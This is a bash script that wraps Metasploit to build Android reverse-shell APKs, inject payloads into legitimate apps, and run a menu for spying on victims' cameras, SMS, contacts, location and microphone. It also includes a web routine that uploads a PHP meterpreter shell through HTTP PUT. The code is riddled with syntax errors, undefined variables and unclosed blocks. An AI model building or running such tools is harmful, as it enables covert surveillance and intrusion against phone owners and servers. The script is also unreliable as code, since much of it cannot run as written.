function metasploit()
{
echo " CREDITS TO THE INTERNET FOR THE KNOWLEDGE IT LEASED ME"
if [ "$PREFIX" = "/data/data/com.termux/files/usr" ]; then
metadir = "
nmapdir = "/data/data/com.termux/files/usr/bin/nmap"
dirbdir = "/data/data/com.termux/files/usr/bin/dirb"
nanodir = "/data/data/com.termux/files/usr/bin/nano"
niktodir = "/data/data/com.termux/files/usr/bin/nikto"

TERMUX = true


elif [ "$(uname)" = "Darwin" ]; then
metadir = "
nmapdir = "
dirbdir = "
nanodir = "
niktodir = "



TERMUX = false
elif


TERMUX = false

echo "        CHECKING FOR REQUIRED TOOLS AND PACKAGES"

if [[ -e  "$nmapdir" ]]; then
echo "Nmap Was Found. Do You Want To Update Or Use Current Version"
echo "Enter 1 To Update,Hit Enter To Skip Update"
read nption
if [[ $nption -eq 1 ]];then
echo " Installing Nmap"
apt install nmap  -y
else
echo "Using Current Version"
fi

if [[ -e  "$metadir" ]]; then
echo "Metasploit Was Found. Do You Want To Update Or Use Current Version"
echo "Update Is About 1.5gb"
sleep 1
echo "Enter 1 To Update,Hit Enter To Skip Update"
read mption
if [[ $mption -eq 1 ]];then
echo " Installing Metaploit"
apt install metasploit  -y
else
echo "Using Current Version"
fi


if [[ -e  "$dirbdir" ]]; then
echo "Dirb Was Found. Do You Want To Update Or Use Current Version"
echo "Enter 1 To Update,Hit Enter To Skip Update"
read dption
if [[ $dption -eq 1 ]];then
echo " Installing Nmap"
apt install dirb  -y
else
echo "Using Current Version"
fi



if [[ -e  "$nanodir" ]]; then
echo "Nmap Was Found. Do You Want To Update Or Use Current Version"
echo "Enter 1 To Update,Hit Enter To Skip Update"
read naption
if [[ $naption -eq 1 ]];then
echo " Installing Nano "
apt install nano  -y
else
echo "Using Current Version"
fi


if [[ -e  "$niktodir" ]]; then
echo "Nmap Was Found. Do You Want To Update Or Use Current Version"
echo "Enter 1 To Update,Hit Enter To Skip Update"
read niption
if [[ $niption -eq 1 ]];then
echo " Installing Nmap"
apt install nikto  -y
else
echo "Using Current Version"
fi




xhead
cd ~ && mkdir cxzpayloads && cd ~/cxzpayloads && mkdir android windows web
systemctl enable postgresql
systemctl start postgresql
sleep 1

#multihandler
function handler()
{
echo " Enter The IP Bound To The Delivered Payload"
read payIP
echo "Enter The Bound Listening Port"
read payPORT
}
#handler for android
function androidhandler()
{
msfconsole

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST "$payIP"

set LPORT "$payPORT"

exploit

sleep 2

androidhandlermenu
}
#handler for putexploit
function puthandler()
{
msfconsole

use exploit/multi/handler

set payload php/meterpreter/reverse_tcp

set lhost "$payIP"

set lport "$payPORT"

run
}
echo "Type 1 For Android Handler, 2 For PutExploit Handler"
echo "Type 3 For Wimdows Handler,4 For...."
read handletype
if [[ $handletype -eq 1 ]];then
androidhandler
elif [[ $handletype -eq 2 ]];then
puthandler
elif [[ $handletype -eq 2 ]];then
windowshandler
else
echo " Use Numbers To select,Restarting"
handler
fi

#andoid multihandler menu
function androidhandlermenu()
{
echo "Established......"
echo " What Do You Want To Exploit From Target?"
echo "[1] Take Snap From Their Camera"
echo "[2] View Their System Info"
echo "[3] View Their Call Log"
echo "[4] View Their Contacts"
echo "[5] Dump Their Sms"
echo "[6] Do A Face Record"
echo "[7] See Their Current Location"
echo "[8] Send SmS "
echo "[9] Listen To Their Conversation "
read snap
if [[ $snap -eq 1 ]]; then
echo "Use Front Or Back Camera?"
echo " Enter 1 For Front Camera  Or 2 For Rear Camera"
read camera
if [[ camera -eq  1 ]];then
webcam_snap -i 1
elif [[ camera -eq 2 ]];then
webcam_snap -i
else
metasploit
fi
elif [[ $snap -eq 2 ]]; then
sysinfo
elif [[ $snap -eq 3 ]]; then
dump_calllog
elif [[ $snap -eq 4 ]]; then
dump_contacts
elif [[ $snap -eq 5 ]]; then
dump_sms
elif [[ $snap -eq 6 ]]; then
webcam_stream
elif [[ $snap -eq 7  ]]; then
geolocate
elif [[ $snap -eq 8 ]]; then
send_sms
elif [[ $snap -eq 9 ]]; then
echo "Enter Time To Record"
read tim
record_mic -d $tim
else
metasploit
fi
}

#android exploits
function android()
{
androdir = "~/cxzpayloads/android"
#reverse tcp

function tcp()
{

echo -e "\e[1;32m _____    ____   ____    ____   _ __   ___     ___    _    ____ \e[0m"
echo -e "\e[1;3m _   _|  / ___| |  _ \  |  _ \ / \\ \ / / |   / _ \  / \  |  _ \ \e[0m"
echo -e "\e[1;32m | |   | |     | |_) | | |_) / _ \\ V /| |  | | | |/ _ \ | | | | \e[0m"
echo -e "\e[1;32m | |   | |___  |  __/  |  __/ ___ \| | | |__| |_| / ___ \| |_| | \e[0m"
echo -e "\e[1;32m |_|    \____| |_|     |_| /_/   \_\_| |_____\___/_/   \_\____/ \e[0m"

echo " Enter The Listening IP/LPORT"
read lhost
echo "Enter Listening Port"
read lport
echo "Enter Output Name. Example,, hacked.apk"
read name
echo "Do You Want To Use Default Output Folder Or Specify Yours?"
echo " Type 1 for Default Or 2 for Personalized Path"
read path
if [[ $path -eq 2 ]];then
echo "Enter The Path For The Output...Dafault  Is ~/cxzpayloads/android/tcp"
read way
outdir = "$way"
else
cd "$androdir" && mkdir tcp
outdir = "$androdir"/tcp
fi
msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" R >"$outdir"/"$name"


echo "Done,Do you Want To Start Listener?"
echo " Enter 1 To Start Listener Or  Else Go Back"
read listener
if [[ $listener -eq 1 ]];then
handler
else
metasploit
fi

}

function embed ()
{
echo "Enter path To The Apk You Want To Inject A Payload"
echo "Example /root/apks/facebook.apk"
read injectapk
echo " Enter The Listening IP/LPORT"
read lhost
echo "Enter Listening Port"
read lport
echo "Enter Output Name,Different From Original Name"
read name
echo "Do You Want To Use Default Output Folder Or Specify Yours?"
echo " Type 1 for Default Or 2 for Personalized Path"
read path
if [[ $path -eq 2 ]];then
echo "Enter The Path For The Output...Dafault  Is $androdir/embeded_payload_apks"
read way
outdir = "$way"
else
cd "$androdir" && mkdir embeded_payload_apks
outdir = "$androdir"/embeded_payload_apks
fi
echo "Do You Want TCP Or HTTP Payload"
echo "1 For TCP Or 2 For HTTP"
read kind
if [[ $kind -eq 1 ]];then
./msfvenom -p android/meterpreter/reverse_tcp -x "$injectapk" LHOST="$lhost" LPORT="$lport" -f raw -o "$outdir"/"$name"
elif [[ $kind -eq 2 ]];then
./msfvenom -p android/meterpreter/reverse_tcp -x "$injectapk" LHOST="$lhost" LPORT="$lport" -f raw -o "$outdir"/"$name"
else
echo "Using Default........."
./msfvenom -p android/meterpreter/reverse_tcp -x "$injectapk" LHOST="$lhost" LPORT="$lport" -f raw -o "$outdir"/"$name"
fi
echo "Done Do Your Thing Now"
echo "Find Your Parcel At $outdir/$name "
echo "Done,Do you Want To Start Listener?"
echo " Enter 1 To Start Listener Or  Else Go Back"
read listener
if [[ $listener -eq 1 ]];then
handler
else
metasploit
fi
}
#reverse http
function http()
{
echo -e "\e[1;31m               _   _   _____   _____   ____    ____   _ __   ___     ___    _    ____\e[0m"
echo -e "\e[1;31m              | | | | |_   _| |_   _| |  _ \  |  _ \ / \\ \ / / |   / _ \  / \  |  _ \\e[0m"
echo -e "\e[1;31m              | |_| |   | |     | |   | |_) | | |_) / _ \\ V /| |  | | | |/ _ \ | | | |\e[0m"
echo -e "\e[1;31m              |  _  |   | |     | |   |  __/  |  __/ ___ \| | | |__| |_| / ___ \| |_| |\e[0m"
echo -e "\e[1;31m              |_| |_|   |_|     |_|   |_|     |_| /_/   \_\_| |_____\___/_/   \_\____/ \e[0m"
echo " Enter The Listening IP/LPORT"
read lhost
echo "Enter Listening Port"
read lport
echo "Enter Output Name. Example,, hacked.apk"
read name
echo "Do You Want To Use Default Output Folder Or Specify Yours?"
echo " Type 1 for Default Or 2 for Personalized Path"
read path
if [[ $path -eq 2 ]];then
echo "Enter The Path For The Output...Dafault  Is ~/cxzpayloads/android/http"
read way
outdir = "$way"
else
cd "$androdir" && mkdir http
outdir = "$androdir"/http
fi
msfvenom -p android/meterpreter/reverse_http LHOST="$lhost" LPORT="$lport" R >"$outdir"/"$name"
echo "Done Do Your Thing Now"
echo "Find Your Parcel At $outdir/$name "
echo "Done,Do you Want To Start Listener?"
echo "Done,Do you Want To Start Listener?"
echo " Enter 1 To Start Listener Or  Else Go Back"
read listenerh
if [[ $listenerh -eq 1 ]];then
handler
else
metasploit
fi
}
echo "Type Number With Desired Exploit"
echo "[1] For Reverse Tcp"
echo "[2] For Reverse Http"
echo "[3] To Compile An Apk With A Payload"
read and
if [[ $and -eq 1 ]]; then
tcp
elif [[ $and -eq 2 ]]; then
http
elif [[ $and -eq 3 ]]; then
embed
else
echo "Restarting.........."
android
fi
}


#windows exploit
function windows()
{
echo " "

}

#web exploits
function web()
{
webdir = "~/cxzpayloads/web"
}
#HTTP PUT EXPLOIT
function put()
{
echo " What Do You Want To Call This Exploit. [PAYLOAD NAME ONLY] Exclude .PhP"
read name
payloadname = "$name".php
cd "$webdir" && mkdir httpput
putshelldir = "$webdur"/httpput
#checking dependancies
#nano
#nmap
#nikto
#curl
#dirb

#checking if server is attackable
echo "First You Check If HTTP-PUT Is Enabled On The Target Server"
echo "Input The Target Server Ip"
read sIP
apt install nmap -y
clear
echo "[★]Enter Target Server IP Adress"
read host
nmap -p- -T4  -A $host

#scan port 80

nmap -p 80 -A $host

#looks for robot.txt or other files visible from our side
echo "Enter name of File found. eg robot.txt."
read found

curl http://$host/$found

#persing found info

dirb http://"$host":"$port"

#checking allowed methods

nmap –script http-methods –script-args http-methods.url-path=’/uploads’,http-methods.test-all -p "$port" "$host"

#ensuring put method is allowed
nikto -host http://$host:$port/uploads
#reverce shell
msfvenom -p php/meterpreter/reverse_tcp lhost="$host" lport="$port" -f raw > putshelldir/"$payloadname"
echo "Please Add PhP Tags For Functionality"
echo "Hit Ctrl + s Then Ctrl + x When Done"
cd putshelldir &&  nano "$payloadname"

nmap -sV –script http-put –script-args http-put.url=’/uploads/"$payloadname"’,http-put.file=’"$putshelldir/payloadname"’ -p "$port" "$hostt"
#uploading the nuke
echo "Do You Want To Use Curl Or Metasploit To Upload The Nuke?"
echo "Type 1 For Metasploit Upload Or 2 For Curl Upload"
read theway
if [[ $theway -eq 1 ]];then
usemeta
elif [[ $theway -eq 2 ]]; then
usecurl
else
usecurl usemeta
fi
#using metasploit
function usemeta ()
{
msfconsole then use auxiliary/scanner/http/http_put

set rhosts "$host"

set rport "$port"

set path /uploads

set filename "$payloadname"

set filedata file:/"$putshelldir"
echo "This Might Say It  Failed But Its Well Done"
}
#with curl
function usecurl()
{
curl -i -X PUT -H “Content-Type: text/plain; charset=utf-8” -d “"$putshelldir"” http://"$host":"$port"/uploads/"$payloadname"
}
echo "Do You Want To Start Multihandler?"
read option
if [[ $option -eq 1 ]];then
handler
else
echo " Done. Restarting.............."
metasploit
fi
}
echo "What Os Do You Want To Exploit?"
echo " Enter 99 To Go Back"
read os
if [[ $os -eq 1 ]];then
android
elif  [[ $os -eq 2 ]];then
windows
elif [[ $os -eq 3 ]];then
web
elif [[ $os -eq 99 ]];then
adv
else
metasploit
fi
}

